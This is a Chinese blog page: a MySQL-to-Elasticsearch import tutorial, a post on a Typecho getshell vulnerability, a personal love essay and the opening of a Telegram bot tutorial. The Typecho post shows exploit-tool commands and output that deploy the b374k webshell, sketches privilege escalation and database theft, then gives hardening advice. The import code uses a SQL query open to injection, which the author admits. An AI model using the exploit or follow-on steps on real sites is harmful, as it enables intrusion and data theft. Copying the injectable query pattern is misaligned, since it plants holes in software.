<h2 id="处理大量结果集、读取多行并写入ES的方法"><a href="#处理大量结果集、读取多行并写入ES的方法" class="headerlink" title="处理大量结果集、读取多行并写入ES的方法"></a>处理大量结果集、读取多行并写入ES的方法</h2><p>既然如此，那么咱只好采取读多行，写入ES，再读取多行，写入ES，直到全部完成为止。</p>
<p>鉴于这样的需求，我们需要解决那些问题呢？</p>
<h3 id="读取多行时的内存消耗"><a href="#读取多行时的内存消耗" class="headerlink" title="读取多行时的内存消耗"></a>读取多行时的内存消耗</h3><p>我使用的MySQL驱动是由<strong>MySQL官方维护的MySQL Connector&#x2F;Python</strong>，而不是大部分网上教程所用的MySQLdb（MySQL-Python）。不选择用MySQLdb的原因是它<strong>上次更新</strong>是2014年，这都2017年了，真是不敢用不更新的基础库啊</p>
<p><img src="/images/110317_1444_PythonMySQ3.png"></p>
<p>图片来源，<a target="_blank" rel="noopener" href="https://pypi.python.org/pypi/MySQL-python/1.2.5">pypi</a> </p>
<p>根据<a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/connector-python/en/connector-python-connectargs.html">MySQL Connector官方文档</a>的说明，Connector默认<strong>不会缓存结果集</strong>。换句话说，在执行<code>cur.execute()</code>之后，程序应该负责处理数据（大白话，你就是select了一个100TB的表，内存也是不会暴涨的）。假如结果集很小，能够一次性处理，那么可以选择<code>buffered=True</code>来缓存数据（或者是设置另一个游标），咱的经验嘛，<code>fetchall()</code>也行，就是得每次运行之后都来一遍。</p>
<p>注意：貌似MySQLdb是默认缓存的。</p>
<p>那如果结果集很大呢，自然不能<code>fetchall()</code>，也不能设置<code>buffered=True</code>了，而要用<code>fetchone()</code>或者<code>fetchmany()</code>。其中<code>fetchmany()</code>这个方法就神奇了，它的参数是指定本次读取多少行结果集（不写就是1行，和<code>fetchone()</code>一样），然后再次运行会<strong>继续读取对应行的结果集</strong>，一行都不对丢，全都读完了返回空列表。所以咱程序员们完全不用考虑offset和limit这类烦人的问题。</p>
<p>PS，我觉得这就是库提供的处理大结果集的方式……没找到还有没有更好的方法了。</p>
<p>哎，咱得说一句，网上的这群人啊，<strong>你抄我我抄你</strong>，你说有用吧还说得过去，都是没用的错误的，有意思嘛。</p>
<p>啊呸，跑题太远了，咱得说说读取多行时怎么限制内存消耗。俺想到了魔术方法<code>__sizeof__</code>和<code>sys.getsizeof()</code>，这俩的区别嘛，<code>sys.getsizeof()</code>会调用对象的<code>__sizeof__</code>方法，如果对象有垃圾回收器的话，还会加上垃圾回收器的内存占用量。</p>
<p>所以咱测试占用100MiB内存是这么写的：</p>
<p><img src="/images/110317_1444_PythonMySQ4.png"></p>
<p>别说，还挺准。</p>
<p>所以咱测试结果集占用内存的时候也差不多是这么写的，然后发现，坑爹了。待我堆上一个Excel折线图：</p>
<p><img src="/images/110317_1444_PythonMySQ5.png"></p>
<p>横轴是getsizeof显示的结果集占用内存的数值（单位理应为字节），取得的数据量依次为1000、10000、10W、20W、30W。我也不知道为啥这个getsizeof显示的数值是不正确的，结果集是标准的内置对象啊，可能他只是显示了外层的列表的内存占用，我还得乘以内层的元组内存占用？（是的我算上了乘以内部元组的大小，结果还是错误的，但也是线性的，还望高人指教怎么做乘法才会得到正确的结果）</p>
<p>我是不是该计算y&#x3D;kx一次函数了？反正就是，这玩意能用，非得计算，或者做参考，还是可以的。 [v_blue]后来经过一段时间的尝试，我终于用它拿到了正确的内存占用，代码可以<a target="_blank" rel="noopener" href="https://github.com/BennyThink/Intern-Life/blob/master/mission%204/mem.py">看这里</a>。之前拿到的结果是呈线性的原因是<code>getsizeof</code>只会获得最外层数据类型的内存占用，所以如果想获得整个变量的内存占用，要递归到基础的不可变类型。当然这递归效率就不太高了，[&#x2F;v_blue] 反正管他怎么的，管他看不看这个折线图的，咱起码可以好好利用<code>fetchmany()</code>这个方法了，所以这块控制的代码大概就是下面这个样子：</p>
<p>cur.execute(‘SELECT * FROM sometable’)<br>while True:<br>  data &#x3D; cur.fetchmany(SIZE)<br>  if data:<br>    pass<br>  else:<br>    break</p>
<p>其中<code>SIZE</code>可以放到文件的最开始，或者写到配置文件中，甚至是另写一个函数、方法来控制计算内存占用。</p>
<h3 id="批量插入ES"><a href="#批量插入ES" class="headerlink" title="批量插入ES"></a>批量插入ES</h3><p>这一点似乎没什么好说的，类似MongoDB，基本上他们需要的批量插入的数据类型就是<strong>列表里面包含着字典</strong>，也就是<code>[&#123;&#125;,&#123;&#125;...]</code>，我们只需要构造字典，在列表中不停的使用<code>append()</code>方法，就可以达到这个目的了。</p>
<h3 id="手动构造字典？我拒绝"><a href="#手动构造字典？我拒绝" class="headerlink" title="手动构造字典？我拒绝"></a>手动构造字典？我拒绝</h3><p>咱在最上面的demo，是手动根据数据库的列名来构造字典的key的，但是这表说不定很复杂，俺以前穷，吃点苦手动也就算了；虽说我现在也很穷，但是，<strong>我傲娇啊，我高冷啊</strong>，就要这么不近人情，不想手动搞四个字典！（再加上这代码也没办法复用啊）</p>
<h3 id="根据列名自动获得键"><a href="#根据列名自动获得键" class="headerlink" title="根据列名自动获得键"></a>根据列名自动获得键</h3><p>想起来了，咱可以通过查询语句得知表里有那些列，然后<strong>把列名取出来作为字典的key</strong>，再正常执行查询得到值，然后使用某种方法把这俩<strong>动态的捏到一起</strong>，再<code>append()</code>到SIZE的次数<del>(￣▽￣)</del>*</p>
<p>没错，看起来这个思路是很好的。</p>
<p>那么咋搞出来列名呢？</p>
<p>cur.execute(‘SHOW COLUMNS from tb’)<br>col_data &#x3D; cur.fetchall()<br>col_field &#x3D; [i[0] for i in col_data]</p>
<p>由于列名也不能多到哪去，直接<code>fetchall()</code>肯定是没问题的，顺便应用了一下列表推导，这样<code>col_field</code>这个列表里就会保存有整个表的列名啦。</p>
<p> </p>
<h3 id="根据键和表内容动态构造字典"><a href="#根据键和表内容动态构造字典" class="headerlink" title="根据键和表内容动态构造字典"></a>根据键和表内容动态构造字典</h3><p>下面可能就到了本篇中最不好搞的一部分了，反正我也不知道我是怎么搞出来的，大概是看了一眼《流畅的Python》吧，差点连字典推导都用上了(ﾉ*･ω･)ﾉ</p>
<p>动态构造字典大概是这样的，其中<code>data</code>是<code>fetchmany()</code>的结果集（列表套元组），<code>bulk_dic</code>是一个列表（我这名字起的不太好）：</p>
<p>for i in range(len(data)):<br>  es_dic &#x3D; dict(zip(col_field, data[i]))<br>  bulk_dic.append(es_dic)</p>
<p>别问我这动态构造字典咋搞出来的，我也是<strong>吭吃瘪肚的胡编乱造</strong>了好久才弄出来的（哎这就是我和大牛的差距啊，人家一杯茶的功夫，我得搞一个小时）</p>
<p>[v_blue]友情提示：</p>
<p>为什么不尝试使用下pymysql.cursors.DictCursor呢？是吧是吧，DictCursor最方便了[&#x2F;v_blue]</p>
<h2 id="齐活！拼凑代码"><a href="#齐活！拼凑代码" class="headerlink" title="齐活！拼凑代码"></a>齐活！拼凑代码</h2><p>所以，基本上思路都有了，各个模块的功能也都实现了，那么就剩下把代码组合在一起，然后测试了！</p>
<p>大体思路就是，利用上面介绍的<code>fetchmany()</code><strong>限制内存占用</strong>，利用<code>col_field和</code>取得的结果集<strong>构造一个正确的字典</strong>，<code>append()</code>到一个列表里，执行插入，然后重新开始一轮循环。</p>
<p>俺最终写出来的代码大概是这样子的（懒，贴图）：</p>
<p><a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/11/110317_1444_PythonMySQ6.png"><img src="/images/110317_1444_PythonMySQ6.png"></a></p>
<p><code>exe_time</code>是俺写的一个装饰器，用于测量一个函数的执行时间。只要调用这个函数，传递两个参数，就可以不管不顾了，这个函数会把<strong>表的名字</strong>当作<code>_index</code>插入到ES中。当然了，我这个<code>SIZE=100</code>有点小，应该根据机器配置进行<strong>适当的调整</strong>。</p>
<p>其中还有几点我不是很理解的地方、以及我觉得有必要再多说几句的地方（我也是瞎猫碰死耗子啊）</p>
<h3 id="paramStyle"><a href="#paramStyle" class="headerlink" title="paramStyle"></a>paramStyle</h3><p>看注释可以得知，</p>
<p>cur.execute(‘SHOW COLUMNS from %s’ % tb)</p>
<p>这一句实际上是<strong>存在注入风险</strong>的。</p>
<p>按照mysql.connector的参数风格pyformat，正常应该是字典或者元组模式就可以的，</p>
<p>字典示例代码如下：</p>
<p>cursor.execute(“SELECT spam FROM eggs WHERE lumberjack &#x3D; %(jack)s”, {‘jack’: lumberjack})</p>
<p>元组示例代码如下：</p>
<p>cursor.execute(“SELECT spam FROM eggs WHERE lumberjack &#x3D; %s”, (lumberjack,))</p>
<p>然而在实际过程中却可耻的抛异常了，不晓得为什么，只好用%和格式化字符拼接下了。</p>
<h3 id="index与-type"><a href="#index与-type" class="headerlink" title="_index与_type"></a>_index与_type</h3><p>对于<code>_index</code>，如果接触过ES的人大概知道，<code>_index</code>大概相当于关系数据库里面的数据库；<code>_type</code>就有点像表了；</p>
<p>咱看个表格吧，对比下SQL、NoSQL和ES，只是个人的理解，未必准确：</p>
<table border="0"><colgroup><col> <col> <col> <col> <col></colgroup><tbody valign="top"><tr><td><span style="font-size: 12pt;">SQL</span></td><td><span style="font-size: 12pt;">Database</span></td><td><span style="font-size: 12pt;">Table</span></td><td><span style="font-size: 12pt;">Row</span></td><td><span style="font-size: 12pt;">Column</span></td></tr><tr><td><span style="font-size: 12pt;">NoSQL</span></td><td><span style="font-size: 12pt;">Database</span></td><td><span style="font-size: 12pt;">Collection</span></td><td><span style="font-size: 12pt;">Document</span></td><td><span style="font-size: 12pt;">Field</span></td></tr><tr><td><span style="font-size: 12pt;">ES</span></td><td><span style="font-size: 12pt;">Index</span></td><td><span style="font-size: 12pt;">Type</span></td><td><span style="font-size: 12pt;">Document</span></td><td><span style="font-size: 12pt;">Field</span></td></tr></tbody></table>

<p>当然了，由于mentor的要求是把每一个表名作为index（数据库），所以上面代码中我是这么写的：</p>
<p>es_dic.update(_index&#x3D;tb, _type&#x3D;’hey’)</p>
<p>这个<code>_type</code>就是随意起的了；</p>
<p>可能你的要求是index叫test，type叫表名，那就 <code>es_dic.update(_index=&#39;test&#39;, _type=tb)</code>，很简单的。</p>
<p>哦对了，我自然还是会写一个函数从<code>information_schema</code>中得出指定数据库中最大的四个表，然后自动处理的，我怎么会自己写四个调用呢！！！<strong>我这么傲娇这么高冷，要是你叫高晓松我叫韩寒我肯定天天把“高处不甚寒”挂在嘴边</strong></p>
<h3 id="理论与实际总是存在差距的"><a href="#理论与实际总是存在差距的" class="headerlink" title="理论与实际总是存在差距的"></a>理论与实际总是存在差距的</h3><p>圈里有一句话，</p>
<blockquote>
<p>In theory, there is no difference between theory and practice. In practice there is.</p>
</blockquote>
<p>上面的这堆代码，在你处理非常非常大的表的时候，很有可能还会因为种种原因抛异常的（基本上是因为超时啊什么的），为了处理这个问题，我们需要在构造es的时候加几个参数，我也是开始导入了才发现还有这么多坑……</p>
<p>es &#x3D; Elasticsearch(timeout&#x3D;30, max_retries&#x3D;10, retry_on_timeout&#x3D;True)</p>
<p>在连接到数据库之后修改三个参数，以免超时提示<code>Lost connection to MySQL server</code></p>
<p>cur.execute(“SET GLOBAL max_allowed_packet&#x3D;1073741824”)<br>cur.execute(‘SET GLOBAL CONNECT_TIMEOUT &#x3D; 60’)<br>cur.execute(‘SET SESSION NET_READ_TIMEOUT &#x3D; 600’)</p>
<p>当然，具体数值需要大家自己掌握。</p>
<p>完整的最新代码会在12月17日之前开源。</p>
<h2 id="最后的总结"><a href="#最后的总结" class="headerlink" title="最后的总结"></a>最后的总结</h2><p>所以所以，这段函数能干啥？</p>
<p>接受俩参数，一个数据库名，一个表名，将<strong>表名作为index</strong>把全部数据<strong>批量高效可靠</strong>导入到ES中，<strong>不用担心内存</strong>问题，你只需要关心硬盘和选择一个合适的SIZE。</p>
<p>想要批量高效的导入数据到MongoDB也只不过是把<code>helpers.bulk()</code>换成pymongo的<code>insert_many()</code>而已。当然了，想要批量写入文件（比如说csv文件）……呃，还不更容易，都不用构造字典，用好控制内存那段代码就行了。</p>
<p>最后，还希望能够有高手指出，还有没有更方便简洁的方法，比如说什么什么库本身就提供了这个功能等等……</p>
<p>PS，把这个代码开源到GitHub，供大家学习使用，也欢迎PR…… [gt href&#x3D;’<a target="_blank" rel="noopener" href="https://github.com/BennyThink/Intern-Life/blob/master/mission%204/mysql2es.py'/]%E5%BC%80%E6%BA%90%E5%9C%B0%E5%9D%80/[/gt/]">https://github.com/BennyThink/Intern-Life/blob/master/mission%204/mysql2es.py&#39;\]开源地址\[/gt\]</a></p>
<p>紧跟时代潮流，commit是要带签名的。搞得我现在基本上不想用图形化的客户端了，哎，<strong>装逼要紧啊</strong>，装完赶紧跑ε&#x3D;ε&#x3D;ε&#x3D;(<del>￣▽￣)</del></p>
<p><img src="/images/110317_1444_PythonMySQ7.png"></p>
<p>哦对了，秀一下我的kibana！！看起来就很高大上，是吧。</p>
<p><a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/11/110317_1444_PythonMySQ8.png"><img src="/images/110317_1444_PythonMySQ8.png"></a></p>
<blockquote>
<p>本地开发主题测试用WordPress的内心独白：</p>
<p>终于也有哥出头露面的一天了！</p>
</blockquote>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2017/11/03/mysql-es-mongo/index/" data-id="clhp7rthm005bs2qrfvkv7w0m" data-title="使用Python将海量MySQL数据导入Elastic Search/MongoDB" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-typecho-exploit/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2017/10/31/typecho-exploit/index/" class="article-date">
  <time class="dt-published" datetime="2017-10-31T00:00:00.000Z" itemprop="datePublished">2017-10-31</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/justsay/">justsay</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2017/10/31/typecho-exploit/index/">谈谈近期Typecho 的漏洞exploit及预防措施</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>几天前（28日好像是）Typecho被爆出getshell漏洞，想想还是很可怕的。 [v_error]噢对了，我忘记说了，本文仅供学习交流，请不要在未授权的环境中使用此工具。我图中的测试站，是我现搭建的(对就是不想告诉大家我究竟有多少个域名和服务器…)……你就看那个主机名，miss-ed，思念还是错过，多么符合我的文风啊！[&#x2F;v_error]</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>服务器环境</p>
<blockquote>
<p>nginx&#x2F;1.9.5</p>
<p>PHP 7.0.22</p>
<p>mysql Ver 14.14 Distrib 5.5.48</p>
<p>Typecho 1.1 (17.4.24)（好像是1013还是10月28日之前的都有这个问题）</p>
</blockquote>
<p>有没有人想问为什么是Nginx 1.9.5这么老的版本吗……唔</p>
<p><img src="/images/103117_0858_Typecho1.png"></p>
<p><a target="_blank" rel="noopener" href="https://twitter.com/BennyThinks/status/923164944278814721">真是没有比我还蠢的人了</a></p>
<p>利用条件：PHP对webroot拥有写入权限，www的600就够了。如果Typecho对目录没有写权限，那么……没得玩了。</p>
<p>小知识：很多人对Linux中文件目录权限（rwx）的理解可能是有一些偏差的，以下说明不包含root这个天神，root可以无视这三个基础权限的：</p>
<p>对于文件来说，r代表着能够对文件进行读取；w代表着能够对文件内容进行更改（比如说删除一行，增加一行等等），但是w权限并不意味着能够删除文件；x意味着文件可以作为可执行程序，系统不会告诉你一个permission denied</p>
<p>对于目录来说，r意味着能够对目录下的内容进行list，比如说ls test这就意味着你对test要至少有r才能执行ls；w意味着能够对目录下的文件进行删除、创建、重命名；x意味着能够进入该目录成为工作目录，也就是能够cd test</p>
<p>可能有很多人以为，对文件有w权限就能删掉它了吧？不是的哦，是要对文件所在的目录有w权限才可以的。下面的图是一个简单的验证： <img src="/images/103117_0858_Typecho2.png"></p>
<h2 id="利用步骤"><a href="#利用步骤" class="headerlink" title="利用步骤"></a>利用步骤</h2><p>[gt href&#x3D;’<a target="_blank" rel="noopener" href="https://github.com/BennyThink/Typecho/_deserialization/_exploit'/]GitHub%E5%BC%80%E6%BA%90%E5%9C%B0%E5%9D%80/[/gt/]">https://github.com/BennyThink/Typecho\_deserialization\_exploit&#39;\]GitHub开源地址\[/gt\]</a></p>
<p>git clone <a target="_blank" rel="noopener" href="https://github.com/BennyThink/Typecho/_deserialization/_exploit">https://github.com/BennyThink/Typecho\_deserialization\_exploit</a><br>cd Typecho_deserialization_exploit<br>python exp.ty</p>
<p>之后根据提示操作，示例输出：</p>
<blockquote>
<p>root@qcloud:~&#x2F;Typecho_deserialization_exploit# python exp.py 1. Exploit 2. Run any PHP code. post methods. 3. Run system commands such as ls, pwd 4. Deploy b374k Select your action, q to exit: &gt;1 Input your target, i.e:<a target="_blank" rel="noopener" href="http://localhost/ty">http://localhost/ty</a> &gt;<a href="https://example.com/">https://example.com</a> Your target url is <a href="https://example.com/">https://example.com</a> shell: <a href="https://example.com/p0.php">https://example.com/p0.php</a> 1. Exploit 2. Run any PHP code. post methods. 3. Run system commands such as ls, pwd 4. Deploy b374k Select your action, q to exit: &gt;2 1 . <a href="https://example.com/p0.php">https://example.com/p0.php</a> Enter your target number: &gt;1 Enter your PHP code: &gt;echo ‘pwned’; pwned 1. Exploit 2. Run any PHP code. post methods. 3. Run system commands such as ls, pwd 4. Deploy b374k Select your action, q to exit: &gt;3 1 . <a href="https://example.com/p0.php">https://example.com/p0.php</a> Enter your target number: &gt;1 Enter your system commands: &gt;ls 1. Exploit 2. Run any PHP code. post methods. 3. Run system commands such as ls, pwd 4. Deploy b374k Select your action, q to exit: &gt;4 1 . <a href="https://example.com/p0.php">https://example.com/p0.php</a> Enter your target number: &gt;1 visit <a href="https://example.com/b374k.php">https://example.com/b374k.php</a> 1. Exploit 2. Run any PHP code. post methods. 3. Run system commands such as ls, pwd 4. Deploy b374k Select your action, q to exit: &gt;</p>
</blockquote>
<p>成功写入webshell，第三步执行系统命令没有回显是因为我禁用了<code>system()</code>函数</p>
<p><img src="/images/103117_0858_Typecho3.png"></p>
<p><img src="/images/103117_0858_Typecho4.png"></p>
<p>由于运行PHP的用户是一个低权限的non-login shell用户www，所以嘛……没有SMB那么爽的感觉了。当然Windows就没有这个说法了，说不定人品好，还有人是拿管理员运行的PHP呢……这个时候就可以有mimikatz了。</p>
<h2 id="更进一步的玩法"><a href="#更进一步的玩法" class="headerlink" title="更进一步的玩法"></a>更进一步的玩法</h2><p>只是一点点猜想，仅供参考</p>
<h3 id="内核提权漏洞"><a href="#内核提权漏洞" class="headerlink" title="内核提权漏洞"></a>内核提权漏洞</h3><p>通过<code>phpinfo</code>拿到系统信息，去exploit找对应的内核提权漏洞，想办法吧www提权成root</p>
<h3 id="脱库与跑路"><a href="#脱库与跑路" class="headerlink" title="脱库与跑路"></a>脱库与跑路</h3><p>通过读取Typecho的配置文件<code>config.inc.php</code>拿到数据库账号密码，塞满垃圾文件，脱库与跑路什么的；顺着搜搜有没有MySQL的什么安全漏洞可以利用、绕过。</p>
<h3 id="报告给博主"><a href="#报告给博主" class="headerlink" title="报告给博主"></a>报告给博主</h3><p>对，这才是正经的嘛……当然了，那些连个联系方式也不留的、八百年不发一篇博文的、whois查不到邮箱的、评论也不管的死灰一样的博客，那活该了。我也很无奈啊。</p>
<h2 id="预防措施和一些建议"><a href="#预防措施和一些建议" class="headerlink" title="预防措施和一些建议"></a>预防措施和一些建议</h2><h3 id="升级Typecho到最新的版本或者删除文件"><a href="#升级Typecho到最新的版本或者删除文件" class="headerlink" title="升级Typecho到最新的版本或者删除文件"></a>升级Typecho到最新的版本或者删除文件</h3><p>升级Typecho到最新版本，或者删除<code>install.php</code>和<code>install</code>目录。暂时不能更新的，关站保平安吧。</p>
<h3 id="使用www、mysql等non-login-shell用户运行Apache-x2F-Nginx、PHP、MySQL"><a href="#使用www、mysql等non-login-shell用户运行Apache-x2F-Nginx、PHP、MySQL" class="headerlink" title="使用www、mysql等non-login shell用户运行Apache&#x2F;Nginx、PHP、MySQL"></a>使用www、mysql等non-login shell用户运行Apache&#x2F;Nginx、PHP、MySQL</h3><p>千万不要拿root跑啊，这要是拿root跑了，那就和SMB漏洞是一样一样滴爽。</p>
<h3 id="记得更新系统，不要使用已无支持的操作系统"><a href="#记得更新系统，不要使用已无支持的操作系统" class="headerlink" title="记得更新系统，不要使用已无支持的操作系统"></a>记得更新系统，不要使用已无支持的操作系统</h3><p>EOL（End of Life）的就不要用了，没有安全更新，万一被人找到提权，那不就完蛋了吗。</p>
<p>举例说明，Windows XP，Windows 2003，Windows Vista，CentOS 5,Ubuntu 12.04等等……</p>
<p>对于发行版来说，可以用cron来计划更新，比如说我是这么干的：</p>
<p>0 3 *&#x2F;3 * * apt update &amp;&amp; apt upgrade -y</p>
<p>每隔三天的凌晨三点都会更新一波</p>
<h3 id="尽可能的使用Linux当服务器"><a href="#尽可能的使用Linux当服务器" class="headerlink" title="尽可能的使用Linux当服务器"></a>尽可能的使用Linux当服务器</h3><p>嗯……如果你用Windows的话，在这种情况下webshell就可以大显神通了……</p>
<h3 id="配置php-ini"><a href="#配置php-ini" class="headerlink" title="配置php.ini"></a>配置php.ini</h3><p>配置<code>open_basedir</code>,不让PHP程序访问本身目录以外的目录，比如说我是这么配置的：</p>
<p>open_basedir&#x3D;&#x2F;home&#x2F;wwwroot&#x2F;dmesg.app:&#x2F;tmp&#x2F;:&#x2F;proc&#x2F;</p>
<p>并且如果不需要的话，那么就禁用一些比较危险的函数，比如说<code>system()</code>、<code>exec()</code></p>
<h3 id="别没事干就777"><a href="#别没事干就777" class="headerlink" title="别没事干就777"></a>别没事干就777</h3><p>除非你懂得777是什么意思，知道你这次的777有何影响。</p>
<p>别说777了，任何更改文件目录（包括web目录）权限的操作都要三思而后行，尤其是某些特别敏感的文件，比如说如果某人的<code>/etc/shadow</code>的权限是644（原本应该是640），那么任何人都可以读取了……</p>
<p>小提示：Linux下默认文件目录权限是怎么回事</p>
<p>Linux下有一个东西叫做<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Umask">umask</a>，一般发行版都会是0022，我们只看后三位022，0意味着不拿掉任何权限，2代表拿掉2写权限。</p>
<p>所以对于目录来说，最高权限是rwxrwxrwx（777），那么同组和其他人拿掉写权限，也就是rwxr-xr-xr，换成数字就是755啦；</p>
<p>而文件呢，要比目录再少一个x权限，也就是再<strong>拿掉x</strong>，那么文件就是rw-r–r–也就是644了。为啥要把文件拿掉x可执行权限啊？可执行太危险了呗。</p>
<p>请一定要注意，<strong>不要做减法</strong>（7-2&#x3D;5）！！这样在umask已经拿掉x权限时（umask值包含1，3，5）会出错的。比如说如果umask是011，那么做减法，目录是766（rwx-rw-rw），文件是655（rw-r-xr-x），文件已经拿掉了x，怎么又出现了x呢？？是吧。正确的应该是目录rwx-rw-rw（766），文件拿掉x变为rw-rw-rw（666）</p>
<h3 id="开启App-Armor、SELinux等"><a href="#开启App-Armor、SELinux等" class="headerlink" title="开启App Armor、SELinux等"></a>开启App Armor、SELinux等</h3><p>不好意思，这个我不太会玩……不过……很多人拿到一台CentOS都是……第一步……关闭SELinux的吧……</p>
<h2 id="更多参考资料"><a href="#更多参考资料" class="headerlink" title="更多参考资料"></a>更多参考资料</h2><p><a target="_blank" rel="noopener" href="http://ph0rse.me/2017/10/30/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BTypecho%E4%BA%8C%E8%BF%9E%E7%88%86/">ph0rse</a> <a target="_blank" rel="noopener" href="https://joyqi.com/typecho/about-typecho-20171027.html">joyqi</a> <a target="_blank" rel="noopener" href="http://www.blogsir.com.cn/safe/454.html">blogsir</a> <a target="_blank" rel="noopener" href="https://github.com/b374k/b374k">b374k</a></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>此次漏洞的影响还是比较大的，至少吧……攻击者能够拿到webshell，再怎么也能拿到整个数据库的权限了。</p>
<p>哦对，trick or treat?</p>
<blockquote>
<p>賢狼ホロ：?羡慕高产（</p>
</blockquote>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2017/10/31/typecho-exploit/index/" data-id="clhp7rtmj00aas2qr5aaxhk60" data-title="谈谈近期Typecho 的漏洞exploit及预防措施" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-my-love/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2017/10/29/my-love/index/" class="article-date">
  <time class="dt-published" datetime="2017-10-29T00:00:00.000Z" itemprop="datePublished">2017-10-29</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/justsay/">justsay</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2017/10/29/my-love/index/">眼见何事，情系何处，身在何方，心思何人？</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>我曾经喜欢过一个人。</p>
<p>我和她相识于差不多一年前的12月9日，我记得这么清楚是因为那天我几乎没睡觉，大概是被导员的MacBook所吸引吧。她来找我，是因为她也想像我一样，有一个自己的博客。于是便聊得很开心，相见恨晚。后来我发现我似乎喜欢上她了，后来在23日，也真的是很巧的一天，我把她约出来见面，帮她搭建了Typecho的博客，好像更喜欢她了吧。尽管我的心意早已被她发现，也早已被拒绝，但还是觉得这样无所谓的努力挺好的。</p>
<p>然后一切就这样进行着，为了她我二次开发了一款功能强大的漂亮的Typecho主题，为她提供了很多学习资源，也准备了很多备课资料。甚至是，我没有忘记随想说的一句话，尽可能的去影响身边的人。于是我写出了很多针对性非常强的文章，或者在她的启发引导下写出了很多自觉优秀的文章，有些文章甚至得到了很多大佬的赏识与称赞。甚至是，我带领着她来到墙外，去使用Google，去使用Twitter，去接受自由思想与批判性思维，甚至到后来她有了一个只有我一个联系人的聊天应用：Telegram。</p>
<p>也许就是在这种不明所以的情况下，我开始像有了目标有了动力一样。第一次见面的晚上她说她喜欢Linux和英语好的人，那时我心里暗想，这好像在说我。然后我通过了专八，找到了满意的工作，混得“风生水起”，也更进一步的走向了Linux。</p>
<p>我记不清我都做了些什么，但是每件事情都已经倾尽全力。我们曾经一起出来学习，也去看过IMAX电影。在我最难过最绝望最需要拥抱的时候，她买了樱桃陪我在操场聊天。可能就这样吧，在某个时间点，我以为我们在一起了，我在想，我不知道有多久我没有体验过那种温暖的拥抱。那次在影院里一起看的《敦刻尔克》可能是人生中最美好的一次观影体验了吧，从来不哭的我竟然在送走你之后哭了一晚上。天呐，我大学的第三个梦想，完成了啊。</p>
<p>不，并没有。直到你告诉我你有了男朋友，我才意识到我只完成了前两个梦想。两个月，变化的这么快，连Telegram都从你的手机里消失不见了，不知道一起消失不见的是否也有自由思想、独立思考与批判性思维。我甚至开始害怕发生《伤仲永》那样的事情。</p>
<p>但这些都是我的主观看法啊，也许你只是一直很厌烦我吧，也许我只是在自作多情吧。你的博客停留在一个月前的更新，你的面容也定格在一个月之前。如果我足够理性，我应该继续帮你维护博客，去关注Typecho的开发，去进一步的开发主题，而不是“删库与跑路”吧。</p>
<p>明明与我，我与明明，无论我曾怎样努力，无论我曾怎样与你拥抱，真的要认清这一切了吧。那场欠下的电影与烤鱼，再也见不到了吧……</p>
<p>我该很俗的说一句，祝你幸福。但我是真的希望你幸福，可能这辈子也只能做你的知己，你的好友，只要看到你好，我就开心，不会去打扰你的生活。哦不，可能这辈子也只能做一个很普通的朋友了吧，我只是你的学长，也许只是陌生人吧。你是我曾经深爱的那个学妹。</p>
<p>你好，我的爱人。斯人若彩虹，遇上方知有。</p>
<p>放上这首歌吧，很快再相聚。简直不能找到更合适的歌曲来描述我此时的心情了。你虽离去，但依然留在我心里，留在我的幻梦里。 [netmusic play&#x3D;’0’]27711790[&#x2F;netmusic]</p>
<p> </p>
<p>后记：</p>
<p>当这一切都变得复杂万分，当我知道你对我的信任时，我却不知道该如何是好，我却依旧无法忘记这一切，无法忘记你……你可知我爱你？眼见何事，情系何处，身在何方，心思何人？</p>
<p>你在何方？心思何人？</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2017/10/29/my-love/index/" data-id="clhp7rthl0055s2qr3s42hhik" data-title="眼见何事，情系何处，身在何方，心思何人？" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-tgbot0/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2017/10/20/tgbot0/index/" class="article-date">
  <time class="dt-published" datetime="2017-10-20T00:00:00.000Z" itemprop="datePublished">2017-10-20</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/program/">program</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2017/10/20/tgbot0/index/">[Telegram bot系列]0：用Python写一个Telegram Bot 简单的回话bot</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>[collapse title&#x3D;””]</p>
<p>[&#x2F;collapse]（我知道我还有一个<a target="_blank" rel="noopener" href="https://dmesg.app/ssh-1.html">SSH系列</a>的坑没填完，别催，越催越不填，再催熄火）</p>
<p>终于，又轮到了小土豆我开新系列的日子啦，这也可能是我的为数不多的讲编程的文章。这一系列中我们将详细说说怎么用Python写一个能玩的Telegram bot，顺便学习一下Python中的一些知识点。</p>
